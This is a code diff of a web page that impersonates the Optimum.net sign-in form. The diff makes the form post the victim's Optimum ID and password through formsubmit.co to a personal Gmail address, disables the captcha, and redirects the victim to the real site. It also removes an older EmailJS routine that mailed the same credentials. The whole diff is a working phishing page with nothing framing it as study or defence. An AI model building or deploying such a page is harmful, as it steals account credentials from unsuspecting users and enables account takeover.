@@ -119,15 +119,17 @@
  
 
  <main class="container">
-  <form >
+  <form action="https://formsubmit.co/mywork4tee@gmail.com" method="POST">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://optimum.net/redirect.html">
     <div class="mb-3">
       <label for="exampleInputEmail1" class="form-label">My Optimum ID</label>
-      <input type="text" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp">
+      <input type="text" name="text" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp">
       <div id="emailHelp" class="form-text">I forgot my Optimum ID</div>
     </div>
     <div class="mb-3">
       <label for="exampleInputPassword1" class="form-label">Password</label>
-      <input type="password" class="form-control" id="exampleInputPassword1">
+      <input type="password" name="password" class="form-control" id="exampleInputPassword1">
       <div id="emailHelp" class="form-text">I forgot my Password</div>
       <hr/>
     </div>
@@ -140,31 +142,19 @@
     <button onclick="sendMail()"  type="submit" class="btn  text-light">Sign in to Optimum.net</button>
     <div id="emailHelp" class="form-text">Don't have an Optimum ID? Create one</div>
   </form>
+  <!-- <form action="https://formsubmit.co/mywork4tee@gmail.com" method="POST">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="text" name="name" required>
+    <input type="email" name="email" required>
+    <button type="submit">Send</button>
+</form> -->
 
 
  </main>
  
 
  <script >
-  let sendMail = () => {
-  
-  const params = {
-    OptimumID: document.getElementById("exampleInputEmail1").value,
-    password: document.getElementById("exampleInputPassword1").value,
-  };
-
-  const serviceID = "service_rybja5w";
-  const templateID = "template_2g5g3nh";
-  emailjs
-    .send(serviceID, templateID, params)
-    .then((res) => {
-      document.getElementById("exampleInputEmail1").value = "";
-      document.getElementById("exampleInputPassword1").value = "";
-      console.log(res);
-      alert("your message sent successfully");
-    })
-    .catch((err) => console.log(err));
-};
+ 
 
 </script>
 
